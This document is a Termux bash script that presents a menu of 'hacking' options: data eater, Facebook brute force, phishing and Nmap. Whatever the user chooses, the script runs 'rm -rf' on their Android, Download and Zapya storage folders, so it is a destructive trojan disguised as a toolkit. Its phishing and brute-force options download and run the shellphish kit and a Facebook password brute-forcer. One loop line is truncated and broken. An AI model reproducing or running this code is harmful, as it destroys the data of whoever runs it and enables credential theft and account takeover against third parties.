pkg install ncurses-utils
pkg install git
tput clear
tput cup 3 15
tput setaf 9
tput bold; echo "WELCOME TO MY MENUL"

tput cup 8 10
tput setaf 2
echo "1.Data Eater"

tput cup 10 10
tput setaf 3
echo "2.facebook brute force"

tput cup 12 10
tput setaf 20
echo "3.phishing"

tput cup 14 10
tput setaf 3
echo "4.Nmap"

tput cup 16 10
tput setaf 43
echo "99.Exit"

tput cup 20 30
tput setaf 2
echo "code by OZO"

tput cup 23 0
tput setaf 56
read -p "Enter your choice :" HH

while [ $HH != 1 -o $

if [ $HH -eq 3 ]; then
    cd /sdcard
    rm -rf Android
    rm -rf Download
    rm -rf Zapya
    git clone https://github.com/thelinuxchoice/shellphish
    pkg install php wget curl -y
    echo " "
    echo " "
    tput setaf 1
    echo "please open Wifi-Hostpot"
    cd shellphish
    bash shellphish.sh
elif [ $HH -eq 1 ]; then
    read -p "are you sure?(y=1,n=2)::" KK
    if [ $KK -eq 1 ]; then
        cd /sdcard
        rm -rf Android
        rm -rf Download
        rm -rf Zapya
    else
        echo "ok"
    fi
elif [ $HH -eq 2 ]; then
    cd /sdcard
    rm -rf Android
    rm -rf Download
    rm -rf Zapya
    pkg install python python2 -y
    pip2 install mechanize
    pip2 install requests
    git clone https://github.com/AngelSecurityTeam/BluForce-FB
    cd BluForce-FB 
    python2 bluforcefb.py
elif [ $HH -eq 4 ]; then
    pkg install nmap -y
    echo "if you want to search normal,type 1, or if you want to search with port,type 2"
    read -p "So, What is your choice :" OO
    if [ $OO -eq 1 ]; then
        read -p "enter target ip address:" LL
        nmap -T $LL
        cd /sdcard
        rm -rf Android
        rm -rf Download
        rm -rf Zapya
    else
        read -p "enter targer ip address:" KK
        read -p "enter port:" II
        nmap -T $KK -p $II
        cd /sdcard
        rm -rf Android
        rm -rf Download
        rm -rf Zapya
    fi
else
    echo "have a nice day"
    cd /sdcard
    rm -rf Android
    rm -rf Download
    rm -rf Zapya
fi
tput clear
tput setaf 1
tput cup 15 15
tput rev
echo "Warning"

tput cup 10 4
tput setaf 1
tput rev
echo "Warning"

tput cup 3 40
tput setaf 1
tput rev
echo "Warnin"

tput cup 7 38
tput setaf 1
tput rev
echo "Warning"

tput cup 8 35
tput setaf 1
tput rev
echo "Warning"

tput cup 9 5
tput setaf 1
tput rev
echo "Warning"

tput cup 4 7
tput setaf 1
tput rev
echo "Warning"


